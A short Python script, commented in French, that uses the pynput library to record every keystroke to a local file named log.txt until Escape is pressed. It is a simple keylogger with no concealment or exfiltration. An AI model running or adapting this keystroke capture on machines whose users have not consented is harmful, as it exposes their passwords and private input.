from pynput import *

def on_press(key):
    """recupere les touches presses"""

    try:
        with open("log.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt","a") as f:
            f.write(f"{key}")

def on_release(key):
    """enregistre la touche relachee"""

    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()